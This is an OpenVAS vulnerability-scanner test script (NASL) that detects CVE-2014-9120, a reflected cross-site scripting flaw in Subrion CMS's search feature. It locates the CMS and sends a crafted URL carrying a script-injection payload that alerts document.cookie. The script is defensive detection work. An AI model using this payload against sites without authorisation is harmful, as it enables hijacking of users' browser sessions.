###############################################################################
# OpenVAS Vulnerability Test
#
# Subrion CMS 'search' Functionality Cross Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805400");
  script_version("2022-04-14T11:24:11+0000");
  script_cve_id("CVE-2014-9120");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-14 11:24:11 +0000 (Thu, 14 Apr 2022)");
  script_tag(name:"creation_date", value:"2014-12-17 16:59:56 +0530 (Wed, 17 Dec 2014)");

  script_name("Subrion CMS 'search' Functionality Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"Subrion CMS is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  request and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"This flaw exists due to insufficient
  sanitization of input to the 'Search' functionality before returning it to
  users.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"Subrion CMS version 3.2.2 and possibly
  below.");

  script_tag(name:"solution", value:"Upgrade to Subrion CMS version 3.2.3 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129447/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71655");
  script_xref(name:"URL", value:"https://www.netsparker.com/xss-vulnerability-in-subrion-cms");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.subrion.org/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

cmsPort = http_get_port(default:80);

if(!http_can_host_php(port:cmsPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/cms", "/subrion", http_cgi_dirs(port:cmsPort)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir, "/index.php"), port:cmsPort);

  if(res && 'content="Subrion CMS' >< res && 'Powered by Subrion' >< res)
  {
    url = dir + '/search/;"--></style></scRipt><scRipt>alert(documen' +
                't.cookie)</scRipt>/';

    if(http_vuln_check(port:cmsPort, url:url, check_header:TRUE,
       pattern:"<scRipt>alert\(document\.cookie\)</scRipt>/",
       extra_check: "Powered by Subrion"))
    {
       security_message(port:cmsPort);
       exit(0);
    }
  }
}

exit(99);
